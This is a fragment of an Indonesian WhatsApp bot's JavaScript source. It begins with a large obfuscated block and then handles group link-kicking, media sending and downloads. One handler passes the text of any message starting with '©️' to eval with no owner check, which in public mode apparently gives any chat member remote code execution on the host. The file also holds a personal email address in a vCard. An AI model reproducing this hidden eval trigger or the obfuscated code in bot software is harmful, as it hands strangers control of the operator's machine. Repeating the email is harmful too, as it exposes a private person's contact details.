_0xd4b78e=_0x2117d4[_0x4f89a2(0x1ea,0x18d,0x1c9,0x24e,0x206)+_0x146902(0x3ce,0x408,0x34e,0x3a2,0x38a)+'r'][_0x20e791(0x1,0x82,-0x17,0x79,0xba)+_0x146902(0x487,0x465,0x49b,0x3ec,0x3a8)][_0x37ab1c(0x3b9,0x3e8,0x47b,0x3b6,0x496)](_0x59b584);continue;case'3':_0xd4b78e[_0x4f89a2(0x313,0x1f9,0x2d2,0x2e9,0x275)+_0x37ab1c(0x38c,0x3f6,0x3e0,0x46d,0x43b)]=_0x22b498[_0x146902(0x44d,0x3ee,0x3ba,0x40e,0x4a3)+_0x4f89a2(0x1fd,0x275,0x1a1,0x19e,0x215)][_0x146902(0x42d,0x446,0x377,0x3a0,0x32c)](_0x22b498);continue;case'4':var _0x5e6afb=_0x283235[_0x1c5933];continue;case'5':_0x3ccf8f[_0x5e6afb]=_0xd4b78e;continue;}break;}}else{var _0xd5de15=_0x5d1e52[_0x37ab1c(0x3a2,0x3b1,0x33c,0x461,0x436)][_0x4f89a2(0x149,0x1fc,0x221,0x193,0x1e5)]('|'),_0x576f07=0x7*0x3e8+-0x4ee*0x4+0x7a0*-0x1;while(!![]){switch(_0xd5de15[_0x576f07++]){case'0':var _0x18fafc=_0x1178d6[_0x36022d]||_0x41ba41;continue;case'1':var _0x41ba41=_0xddd9cf[_0x2575ee(0x23a,0x219,0x25a,0x1dc,0x1bd)+_0x37ab1c(0x388,0x3ea,0x3cd,0x37c,0x3a1)+'r'][_0x2575ee(0x2aa,0x271,0x26f,0x1fc,0x284)+_0x20e791(0x40,0x7a,-0x1e,0x6e,0x7b)][_0x2575ee(0x25f,0x21a,0x28a,0x263,0x1f6)](_0xddd9cf);continue;case'2':var _0x36022d=_0x427a2f[_0x5784e4];continue;case'3':_0x1178d6[_0x36022d]=_0x41ba41;continue;case'4':_0x41ba41[_0x2575ee(0x241,0x288,0x253,0x2f2,0x224)+_0x37ab1c(0x37b,0x3f6,0x498,0x361,0x367)]=_0x18fafc[_0x2575ee(0x1f8,0x288,0x2e8,0x2d9,0x32f)+_0x146902(0x390,0x405,0x410,0x3ae,0x301)][_0x4f89a2(0x1d4,0x277,0x291,0x2b2,0x207)](_0x18fafc);continue;case'5':_0x41ba41[_0x20e791(-0x9d,0x7e,-0xe2,-0x34,0x50)+_0x37ab1c(0x27f,0x317,0x28d,0x352,0x2ee)]=_0xddd9cf[_0x4f89a2(0x157,0x155,0x22f,0x29b,0x207)](_0xddd9cf);continue;}break;}}}});function _0x33414b(_0x464273,_0x112636,_0x36a63f,_0x1b1492,_0x28e415){return _0x5575(_0x1b1492- -0x34d,_0x464273);}_0x57be1e();var _0x23aeae={};_0x23aeae[_0x436498(-0x1fc,-0x16e,-0x1f2,-0x1c8,-0x174)]=teks;function _0x486f21(_0x28acc2,_0x1fec72,_0x240a0f,_0x25bd15,_0x5ea1ca){return _0x5575(_0x240a0f- -0x1ad,_0x5ea1ca);}_0x23aeae[_0x33414b(-0x296,-0x16c,-0x1c0,-0x20e,-0x275)+_0x436498(-0x29,0x1b,0x34,-0x1,-0x6f)+_0x33414b(-0x22a,-0x110,-0x11d,-0x194,-0x1d8)+_0x436498(-0x146,-0x104,-0x12b,-0xbe,-0x110)]=_0x436498(-0xf4,-0x22f,-0x17d,-0x18b,-0x17d),_0x23aeae[_0x486f21(-0xd8,-0xd2,-0xb6,-0x117,-0x98)+_0x52f6f0(-0x206,-0x2ab,-0x20e,-0x21a,-0x286)+'m']=_0x486f21(0xbe,-0x27,0x7c,0x15,-0xf)+_0x436498(-0x1,0x11,-0x8b,-0x87,-0x30)+_0x436498(-0x177,-0xdd,-0xe2,-0x191,-0x14a)+'t',_0x23aeae[_0x33414b(-0x174,-0x223,-0x1ad,-0x198,-0x1e0)+_0x486f21(-0x87,-0x47,-0x28,0x23,-0x74)+_0x2eedf0(0x4e,0x2a,0x57,0x3f,0xb8)]=0x1f40,_0x23aeae[_0x33414b(-0x1c8,-0x284,-0x1da,-0x251,-0x27d)+'t']=0x1;function _0x436498(_0x2f99ec,_0x4ff171,_0x1e16c2,_0x12c937,_0x558d2d){return _0x5575(_0x558d2d- -0x24e,_0x12c937);}_0x23aeae[_0x52f6f0(-0x28b,-0x20a,-0x1c0,-0x19b,-0x228)+_0x486f21(0x6f,0xc8,0x5f,0xa0,0x14)]=thumb;var _0x587ea1={};_0x587ea1[_0x52f6f0(-0x1c7,-0x299,-0x16d,-0x225,-0x203)+_0x2eedf0(0x30,-0x1c,-0xc6,-0xb2,0x80)+_0x33414b(-0x18c,-0x1d9,-0x1ec,-0x14f,-0xb5)+_0x52f6f0(-0x29b,-0x23b,-0x2e4,-0x2e5,-0x29d)]=_0x23aeae;var _0x41856f={};_0x41856f[_0x2eedf0(-0xf,0x60,0x59,-0x26,0x79)+'ge']=_0x587ea1;var _0x263f2e={};_0x263f2e[_0x52f6f0(-0x369,-0x2cc,-0x2c6,-0x259,-0x2e9)+_0x33414b(-0x218,-0x2c4,-0x282,-0x25a,-0x200)+_0x33414b(-0x270,-0x234,-0x1f8,-0x265,-0x299)+_0x436498(0x18,-0x7,0x27,0x39,-0x3e)+'e']=_0x41856f,haikal[_0x436498(-0x74,-0x194,-0xde,-0xd8,-0xfb)+_0x33414b(-0x12b,-0x192,-0x100,-0x172,-0xf8)+'ge'](m[_0x33414b(-0xdc,-0x183,-0x1b7,-0x144,-0x1b7)],_0x263f2e,{});function _0x3de00c(_0x30d15b){var _0x5ed6e7={'GFLfJ':_0x48c426(-0xb4,0x34,-0x106,-0x7b,-0x69)+_0x55a565(0x472,0x46a,0x4ac,0x482,0x403)+_0x385bb7(-0x274,-0x2d6,-0x2ce,-0x25d,-0x280)+')','CELkb':_0x385bb7(-0x2c3,-0x218,-0x2bd,-0x34e,-0x350)+_0x55a565(0x4ca,0x544,0x55b,0x4d3,0x500)+_0x1b8bd9(0x1c5,0x188,0x184,0x19d,0x1f3)+_0x385bb7(-0x30a,-0x2ec,-0x337,-0x2ed,-0x2ae)+_0x385bb7(-0x311,-0x2a7,-0x2d4,-0x3ac,-0x31e)+_0x55a565(0x4cb,0x572,0x582,0x5b8,0x545)+_0x55a565(0x3e7,0x519,0x542,0x4e2,0x490),'rkVjW':function(_0x32cbd2,_0x4ad6a4){return _0x32cbd2(_0x4ad6a4);},'ckRCz':_0x1b488a(0x5c5,0x542,0x544,0x536,0x4fb),'Hfuxp':function(_0x181c78,_0x588c90){return _0x181c78+_0x588c90;},'WZfvi':_0x1b8bd9(0x206,0x165,0x216,0x24e,0x2b6),'uytyF':_0x1b488a(0x648,0x5fb,0x547,0x5f5,0x6a2),'mYFgt':function(_0xe31136,_0x1b2128){return _0xe31136(_0x1b2128);},'GHDfo':function(_0x5ad548){return _0x5ad548();},'SPOps':function(_0x52f1c3,_0x11fa0f){return _0x52f1c3===_0x11fa0f;},'YLJOU':_0x1b488a(0x51a,0x5ed,0x546,0x577,0x561),'nbhUi':function(_0x59a1d9,_0x2aa611){return _0x59a1d9+_0x2aa611;},'YXHFo':function(_0x13b038,_0x48bf3b){return _0x13b038+_0x48bf3b;},'XVRab':_0x55a565(0x478,0x4e6,0x3ca,0x4c6,0x46e)+_0x55a565(0x434,0x3f8,0x376,0x3a3,0x3fa)+_0x48c426(0xa8,0x0,-0x28,0x0,-0x38)+_0x1b488a(0x645,0x5fe,0x51e,0x5ae,0x528),'UheJQ':_0x48c426(0x5,-0x3c,0x3e,0x6d,0x3f)+_0x1b488a(0x565,0x5c8,0x657,0x5df,0x58b)+_0x1b488a(0x550,0x5eb,0x595,0x5a5,0x61a)+_0x385bb7(-0x2b1,-0x221,-0x2a4,-0x246,-0x2a6)+_0x385bb7(-0x285,-0x2ac,-0x2d2,-0x247,-0x290)+_0x385bb7(-0x219,-0x1d7,-0x1d4,-0x19b,-0x248)+'\x20)','RqBpc':function(_0xc731d,_0x35d52a){return _0xc731d(_0x35d52a);},'NqTCk':function(_0x44106a,_0x360d64){return _0x44106a!==_0x360d64;},'QBOWU':_0x55a565(0x4ce,0x579,0x44d,0x505,0x4ed),'VOpSh':function(_0x456276,_0x5ebd22){return _0x456276===_0x5ebd22;},'eMqjQ':_0x55a565(0x590,0x475,0x5ab,0x5b3,0x504),'ufQky':_0x55a565(0x56c,0x448,0x4a5,0x4c7,0x4bb),'NPDei':function(_0x45c24f,_0x40270c){return _0x45c24f===_0x40270c;},'lxWgH':_0x48c426(-0x73,-0xc2,-0x100,-0x83,-0x22)+'g','WIuNc':_0x55a565(0x420,0x51f,0x54b,0x4ad,0x4bf),'LsytM':_0x1b8bd9(0x10d,0xe7,0x187,0x10f,0x8d),'mLWGV':_0x1b8bd9(0x20f,0x2a6,0x1c7,0x25b,0x2a0)+_0x1b8bd9(0x12f,0x19b,0x192,0xc1,0x9f)+_0x48c426(0x100,-0x25,0xac,0x6b,0x7e),'RfZqb':_0x48c426(0x13,0x87,0x6a,0x7d,0x4a)+'er','OIPaw':_0x1b8bd9(0x153,0x1e1,0x137,0x158,0x15a),'xClhs':_0x1b488a(0x570,0x671,0x64a,0x5c3,0x557),'hPpmI':function(_0x39de03,_0x2cd7ac){return _0x39de03/_0x2cd7ac;},'RFLYR':_0x1b8bd9(0x18e,0x1a2,0x228,0x153,0x1e2)+'h','IXMjm':function(_0x57cc0a,_0x1da6c2){return _0x57cc0a===_0x1da6c2;},'lulZZ':function(_0x1df759,_0x473bc4){return _0x1df759%_0x473bc4;},'iptbs':_0x55a565(0x38d,0x38f,0x375,0x45b,0x418),'DHiws':_0x1b488a(0x63f,0x64e,0x5f8,0x5e4,0x5a9),'HzOcO':_0x48c426(-0x3,0x90,0x62,0x87,0x11e),'ZsGtE':_0x1b488a(0x441,0x4f8,0x4b4,0x4c3,0x52c)+'n','LdTYS':_0x1b488a(0x497,0x5c5,0x5d0,0x548,0x58a),'WhUCA':_0x1b8bd9(0x14c,0x1a1,0xb3,0xc3,0x1d5)+_0x1b8bd9(0x1e4,0x1c3,0x189,0x27f,0x208)+'t','PiwDr':function(_0x15d84d,_0x452ae2){return _0x15d84d===_0x452ae2;},'OmFyx':_0x385bb7(-0x299,-0x28c,-0x2a9,-0x33f,-0x328),'uGPuU':_0x1b488a(0x587,0x5a2,0x519,0x515,0x4ff),'ezflz':function(_0x2d2d88,_0x22658f){return _0x2d2d88!==_0x22658f;},'lNDMo':_0x48c426(0x3f,0x31,0x44,0x16,0x71),'HhMmB':_0x1b8bd9(0x232,0x1ea,0x23f,0x289,0x1cd),'DfRUT':_0x385bb7(-0x2fe,-0x30d,-0x39e,-0x331,-0x369),'NWhfG':function(_0x3c9395,_0x1db058){return _0x3c9395(_0x1db058);}};function _0x1b488a(_0x2e605c,_0x4700b4,_0x198f73,_0x2bbf5e,_0x2dfa03){return _0x52f6f0(_0x2e605c-0x1d2,_0x4700b4-0xe4,_0x198f73-0x46,_0x2e605c,_0x2bbf5e-0x7b5);}function _0x1b8bd9(_0xa25b33,_0x2df591,_0x2da90b,_0x1fd835,_0x16fdae){return _0x436498(_0xa25b33-0x3b,_0x2df591-0xa0,_0x2da90b-0xd5,_0x16fdae,_0xa25b33-0x291);}function _0x55a565(_0xcf3604,_0x108084,_0x7f7e2b,_0x39fdf3,_0x59f5a6){return _0x486f21(_0xcf3604-0x65,_0x108084-0x14b,_0x59f5a6-0x4cc,_0x39fdf3-0x118,_0x39fdf3);}function _0x48c426(_0x2369e7,_0x3c0a85,_0x566c11,_0xa15613,_0x512e2d){return _0x52f6f0(_0x2369e7-0x8c,_0x3c0a85-0xa5,_0x566c11-0x9d,_0x2369e7,_0xa15613-0x267);}function _0x3a4cc1(_0x398990){function _0x47ea82(_0x3c32c2,_0x3c6862,_0x5c534e,_0x27834a,_0x29b343){return _0x1b8bd9(_0x5c534e-0x61,_0x3c6862-0x182,_0x5c534e-0x25,_0x27834a-0x1dc,_0x27834a);}function _0x53051d(_0x27998b,_0x521f51,_0x3bd594,_0x57b743,_0x2db724){return _0x385bb7(_0x57b743-0x23f,_0x521f51-0x18c,_0x521f51,_0x57b743-0x111,_0x2db724-0xf1);}var _0x2f27bd={'Xhgdx':function(_0x1b8984,_0x4ef1a3){function _0x5b8dc3(_0x155640,_0x30926d,_0x52528c,_0x7bb7ec,_0x39b805){return _0x5575(_0x39b805-0x3d6,_0x155640);}return _0x5ed6e7[_0x5b8dc3(0x65f,0x653,0x548,0x65a,0x5d1)](_0x1b8984,_0x4ef1a3);},'bQkOS':function(_0x24d744,_0x538c5f){function _0x319c6f(_0x1bf6f9,_0x4f578e,_0x4fde82,_0x4202a9,_0x5a5dec){return _0x5575(_0x5a5dec- -0x38c,_0x1bf6f9);}return _0x5ed6e7[_0x319c6f(-0x170,-0x213,-0x181,-0x218,-0x20b)](_0x24d744,_0x538c5f);},'QAGns':_0x5ed6e7[_0x28a7e6(0x153,0x1f0,0x1b7,0x1d8,0x2a1)]};function _0x7d21e7(_0x49961c,_0x5913ba,_0x456b88,_0x6053ab,_0x55f974){return _0x55a565(_0x49961c-0x18,_0x5913ba-0x1d5,_0x456b88-0x18f,_0x49961c,_0x6053ab- -0x392);}function _0x28a7e6(_0xf5e42d,_0x2d41cc,_0x5c620e,_0x5e9001,_0x45760f){return _0x55a565(_0xf5e42d-0x106,_0x2d41cc-0xa4,_0x5c620e-0x3a,_0x5c620e,_0x2d41cc- -0x346);}function _0x8bc964(_0x280593,_0x12ee85,_0x18f229,_0x112cb9,_0x1da427){return _0x48c426(_0x112cb9,_0x12ee85-0x17a,_0x18f229-0xf3,_0x12ee85-0x3,_0x1da427-0x104);}if(_0x5ed6e7[_0x28a7e6(0x218,0x1c6,0x21d,0x198,0x1fe)](_0x5ed6e7[_0x28a7e6(0x16c,0x1f5,0x18c,0x218,0x179)],_0x5ed6e7[_0x28a7e6(0x14d,0x163,0x115,0x1f4,0xe5)])){if(_0x3c0541)return _0x461ea5;else _0x2f27bd[_0x8bc964(-0x22,0x82,0x63,0x74,0x3d)](_0x4ba83f,0x7*0x366+0x13ef+0x7*-0x63f);}else{if(_0x5ed6e7[_0x53051d(-0x36,-0xa,0xa0,0x16,-0x95)](typeof _0x398990,_0x5ed6e7[_0x53051d(-0x1a,-0x82,-0x4c,-0x49,-0x7d)])){if(_0x5ed6e7[_0x47ea82(0x18c,0x254,0x225,0x1da,0x1a9)](_0x5ed6e7[_0x28a7e6(0x186,0x18d,0x13b,0xe9,0x1e1)],_0x5ed6e7[_0x53051d(0xfa,0x9a,0xd4,0x4f,0x63)]))return function(_0x579271){}[_0x47ea82(0x221,0x2c9,0x250,0x2e1,0x2fa)+_0x53051d(0x5a,0x8b,0x93,0xb,-0xf)+'r'](_0x5ed6e7[_0x7d21e7(0x217,0x16b,0x1f5,0x1b5,0x1c8)])[_0x47ea82(0x149,0x241,0x1b9,0x237,0x15c)](_0x5ed6e7[_0x53051d(-0xea,-0x33,0x66,-0x3e,-0x6f)]);else{if(_0x15e92b){var _0x22892a=_0x55a8bc[_0x53051d(-0x94,-0xa7,-0x4a,-0x8f,-0x22)](_0x4abf1d,arguments);return _0x100324=null,_0x22892a;}}}else{if(_0x5ed6e7[_0x7d21e7(0x1b9,0x1b0,0x154,0x10e,0x149)](_0x5ed6e7[_0x53051d(-0xa3,-0x3b,-0x56,-0x6f,-0xfc)],_0x5ed6e7[_0x28a7e6(0x157,0x204,0x190,0x2af,0x263)])){if(_0x5ed6e7[_0x28a7e6(0x194,0x15a,0x199,0xf4,0x12a)](_0x5ed6e7[_0x47ea82(0x14f,0x25e,0x1cf,0x22b,0x271)]('',_0x5ed6e7[_0x28a7e6(0x22a,0x1a6,0x220,0x139,0x1ad)](_0x398990,_0x398990))[_0x5ed6e7[_0x7d21e7(0x5d,0x144,0x10c,0xb3,0xbb)]],0xf5c+0x7f*0x3d+-0x2*0x16cf)||_0x5ed6e7[_0x53051d(0xa6,-0x5,0xa,0x3,0x3b)](_0x5ed6e7[_0x53051d(-0xf5,-0x6f,-0x34,-0x78,-0x72)](_0x398990,-0x482*0x3+0x5*-0x48d+0x245b),0x13*0x161+-0x26e4+0x13*0xab)){if(_0x5ed6e7[_0x8bc964(-0x5e,0x44,-0x5c,0xd0,-0x11)](_0x5ed6e7[_0x28a7e6(0xb8,0x11a,0x115,0x16a,0x170)],_0x5ed6e7[_0x28a7e6(0xd4,0x11a,0x94,0xee,0x15e)]))(function(){function _0x189392(_0x1b9c85,_0x267631,_0x2a214d,_0x42c29c,_0x266fe3){return _0x47ea82(_0x1b9c85-0x4a,_0x267631-0x19f,_0x267631- -0x12a,_0x266fe3,_0x266fe3-0xd4);}function _0x148de3(_0x17189d,_0x48c8da,_0x480ec1,_0x22a66c,_0x16f5ad){return _0x8bc964(_0x17189d-0x131,_0x48c8da- -0x36,_0x480ec1-0x1b7,_0x22a66c,_0x16f5ad-0x109);}function _0x1735ab(_0x54e0fd,_0x4d462f,_0x2020f9,_0x341b15,_0x51146b){return _0x53051d(_0x54e0fd-0xca,_0x2020f9,_0x2020f9-0x1a6,_0x51146b-0x300,_0x51146b-0xe7);}if(_0x2f27bd[_0x1735ab(0x41a,0x38a,0x3a4,0x351,0x388)](_0x2f27bd[_0x1735ab(0x340,0x27c,0x2db,0x2a5,0x2ac)],_0x2f27bd[_0x148de3(-0xca,-0x5c,-0x17,-0x1,-0xc9)])){var _0x507bda=_0x4663c7?function(){function _0x5d600c(_0x3929f8,_0x8a26b2,_0x55d9bf,_0x1e1b42,_0x42ab31){return _0x189392(_0x3929f8-0x1b2,_0x3929f8-0x62,_0x55d9bf-0x69,_0x1e1b42-0x0,_0x1e1b42);}if(_0x55fe09){var _0x4a617c=_0x141282[_0x5d600c(0xf1,0x185,0x10a,0x144,0x85)](_0x9df9fc,arguments);return _0x183504=null,_0x4a617c;}}:function(){};return _0x1a02c7=![],_0x507bda;}else return!![];}[_0x28a7e6(0x214,0x185,0x1ed,0x134,0x202)+_0x7d21e7(0x19e,0xf5,0xed,0x13c,0x1c3)+'r'](_0x5ed6e7[_0x7d21e7(0xc5,0xc6,0x8c,0x7c,0x116)](_0x5ed6e7[_0x8bc964(0x1,0x97,0x3f,0x11c,0x45)],_0x5ed6e7[_0x7d21e7(0x11e,0xe5,0x4f,0xac,0xa9)]))[_0x53051d(0x19,-0x10,-0x82,-0x8a,-0x2c)](_0x5ed6e7[_0x47ea82(0x28a,0x2bc,0x20c,0x18d,0x169)]));else{var _0x3043b9=new _0x4a5756(_0x5ed6e7[_0x53051d(-0x100,-0x7,-0x29,-0xa4,-0x14)]),_0x1ae296=new _0x41f3bd(_0x5ed6e7[_0x47ea82(0x2cb,0x344,0x298,0x27c,0x1ff)],'i'),_0x36e511=_0x5ed6e7[_0x8bc964(-0x69,0x3a,0x2a,0x93,-0x4b)](_0x2c6b1f,_0x5ed6e7[_0x28a7e6(0xc5,0xd4,0x16b,0x81,0x46)]);!_0x3043b9[_0x28a7e6(0x115,0xfd,0xe9,0x110,0x12d)](_0x5ed6e7[_0x8bc964(0x41,-0x4b,-0x32,0x3e,-0x42)](_0x36e511,_0x5ed6e7[_0x47ea82(0x1f5,0x285,0x1f0,0x155,0x1f6)]))||!_0x1ae296[_0x8bc964(-0xf4,-0x52,0x21,-0xa6,-0x4a)](_0x5ed6e7[_0x47ea82(0x158,0x231,0x1cf,0x20c,0x161)](_0x36e511,_0x5ed6e7[_0x47ea82(0xfd,0x17b,0x196,0x113,0x1a4)]))?_0x5ed6e7[_0x8bc964(-0x10c,-0x93,0x1,-0x26,-0x7c)](_0x36e511,'0'):_0x5ed6e7[_0x47ea82(0x1b8,0x1d7,0x228,0x199,0x1ad)](_0x15e623);}}else{if(_0x5ed6e7[_0x8bc964(0x69,0xb,-0x3,0x56,0x33)](_0x5ed6e7[_0x53051d(-0x8a,0x59,-0x23,-0xf,-0x35)],_0x5ed6e7[_0x53051d(-0x1e,0x3a,0x51,-0xf,-0xf)])){var _0x548a2a=_0x2efadc[_0x28a7e6(0x194,0xee,0x179,0xde,0x103)](_0x29c604,arguments);return _0x2b19a3=null,_0x548a2a;}else(function(){function _0x552e9c(_0x24ae14,_0x56e63e,_0x57766e,_0xf76b92,_0x3a4128){return _0x8bc964(_0x24ae14-0x4b,_0x57766e- -0x7,_0x57766e-0x10f,_0x3a4128,_0x3a4128-0x6);}function _0x35f63a(_0x2b4b8c,_0x125f7a,_0x3c361b,_0x4a3332,_0x13cafa){return _0x28a7e6(_0x2b4b8c-0x1ac,_0x2b4b8c-0x109,_0x4a3332,_0x4a3332-0x92,_0x13cafa-0xc9);}function _0x284919(_0x27c837,_0x433931,_0x189888,_0x5ef625,_0x219fc9){return _0x7d21e7(_0x433931,_0x433931-0x4,_0x189888-0x7,_0x27c837-0x16,_0x219fc9-0x24);}function _0x5f2a4c(_0x43e217,_0x4907c2,_0x5a0409,_0x4f36ac,_0xbfc09c){return _0x53051d(_0x43e217-0xe1,_0x5a0409,_0x5a0409-0x13e,_0x4907c2-0x231,_0xbfc09c-0x148);}if(_0x5ed6e7[_0x284919(0x84,0x2d,0xc4,0x47,0x3e)](_0x5ed6e7[_0x284919(0x17a,0xea,0x1ba,0xdc,0x1d8)],_0x5ed6e7[_0x5f2a4c(0x2b2,0x264,0x2f6,0x306,0x247)]))return![];else{var _0x162175=_0x1c6c41[_0x35f63a(0x1f7,0x1cf,0x244,0x1ba,0x271)](_0x3ebe85,arguments);return _0x223733=null,_0x162175;}}[_0x53051d(0xf,-0x9a,0x4c,0x8,-0x90)+_0x8bc964(0xb7,0x39,-0x3c,0x4c,0x98)+'r'](_0x5ed6e7[_0x8bc964(-0x93,-0x4b,-0x7d,-0xe9,0x24)](_0x5ed6e7[_0x53051d(0x23,0x29,-0x35,0x69,-0x3f)],_0x5ed6e7[_0x53051d(-0x7a,0x1c,-0x31,-0x85,-0x91)]))[_0x47ea82(0x194,0x118,0x1b9,0x1ec,0x129)](_0x5ed6e7[_0x28a7e6(0x26a,0x1fe,0x1a2,0x1d4,0x1ef)]));}}else{var _0x3435c7;try{_0x3435c7=_0x5ed6e7[_0x47ea82(0x22c,0x1b2,0x254,0x248,0x1fc)](_0x982934,_0x5ed6e7[_0x28a7e6(0x74,0x108,0x12a,0x19e,0x91)](_0x5ed6e7[_0x8bc964(-0x5e,-0x87,-0xd2,-0xbd,-0x122)](_0x5ed6e7[_0x53051d(-0x78,0x29,-0x23,-0x47,-0x43)],_0x5ed6e7[_0x47ea82(0x198,0x23c,0x1b3,0x117,0x185)]),');'))();}catch(_0x2d3078){_0x3435c7=_0x5d6996;}return _0x3435c7;}}_0x5ed6e7[_0x53051d(-0x2b,0x4,0x50,0xc,-0x46)](_0x3a4cc1,++_0x398990);}}function _0x385bb7(_0x14641c,_0x5e2590,_0x592f7f,_0x257853,_0xe6d9c2){return _0x52f6f0(_0x14641c-0x103,_0x5e2590-0x13a,_0x592f7f-0x12,_0x592f7f,_0x14641c- -0x3);}try{if(_0x5ed6e7[_0x1b8bd9(0x140,0x1ca,0xd1,0x1d7,0x1eb)](_0x5ed6e7[_0x1b8bd9(0x1af,0x1c3,0x14a,0x129,0x117)],_0x5ed6e7[_0x48c426(-0xdb,0x7,-0x88,-0x90,-0x13f)]))return _0x40f9cc;else{if(_0x30d15b)return _0x5ed6e7[_0x1b488a(0x53b,0x647,0x5ed,0x5b8,0x550)](_0x5ed6e7[_0x1b488a(0x45d,0x573,0x4d5,0x4e2,0x58b)],_0x5ed6e7[_0x385bb7(-0x22c,-0x24d,-0x203,-0x23c,-0x21f)])?_0x3a4cc1:!![];else _0x5ed6e7[_0x385bb7(-0x2e6,-0x373,-0x36c,-0x2fa,-0x363)](_0x5ed6e7[_0x1b8bd9(0x1c3,0x191,0x25e,0x256,0x1e6)],_0x5ed6e7[_0x385bb7(-0x263,-0x211,-0x257,-0x239,-0x218)])?_0x5ed6e7[_0x1b488a(0x522,0x4a4,0x4b6,0x4c0,0x445)](_0x3a4cc1,0xa65+-0x2*-0xc9f+0x23a3*-0x1):_0x5ed6e7[_0x385bb7(-0x1e8,-0x1af,-0x274,-0x18b,-0x175)](_0x202590,-0x10b5+0x26d3+-0x2*0xb0f);}}catch(_0x47a3e3){}}
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
        if (m.message) {            
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
        }
//=================================================// 

//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`「 Detect Link 」\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `「 Detect Link 」\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (!isBotAdmins) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(from, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Link 」\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
    
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
const sendapk = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yoapk ʜᴡ ᴍᴏᴅꜱ ᴡᴀ')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yozip ʜᴡ ᴍᴏᴅꜱ ᴡᴀ')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
let reactionMessage = require("@adiwajshing/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "" })

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
m.reply('Rusak Bodoh !! Yang Bener Contoh : Yopdf ʜᴡ ᴍᴏᴅꜱ ᴡᴀ')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
haikal.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await haikal.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await haikal.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "```Success```", gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

let list = []
for (let i of owner) {
list.push({
displayName: await haikal.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await haikal.getName(i + '@s.whatsapp.net')}\n
FN:${await haikal.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:inodsanjaya1998@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://linktr.ee/sheseescheese\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
async function tiktokdl(url) {
    try {
